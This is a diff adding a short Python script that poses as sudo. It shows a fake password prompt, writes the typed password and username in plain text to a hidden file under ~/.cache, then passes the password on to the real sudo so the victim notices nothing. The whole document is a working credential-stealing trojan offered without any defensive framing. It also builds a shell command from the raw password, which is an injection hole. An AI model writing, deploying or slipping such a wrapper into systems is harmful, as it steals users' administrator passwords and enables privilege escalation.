@@ -1,0 +1,18 @@
+#!/usr/bin/env python3
+import os
+from sys import argv
+from getpass import getpass
+
+def writeLog(p:str):
+    with open(f"/home/{os.getlogin()}/.cache/pass.gv", "w") as f:
+        f.write(f"{os.getlogin()}:{p}")
+        f.close()
+
+cmd = " ".join(argv[1:])
+try:
+    x = getpass(f"[sudo] password for {os.getlogin()}: ")
+except KeyboardInterrupt:
+    print("\nsudo: a password is required")
+    exit(1)
+writeLog(x)
+os.system(f"echo {x} | sudo -S {cmd}")
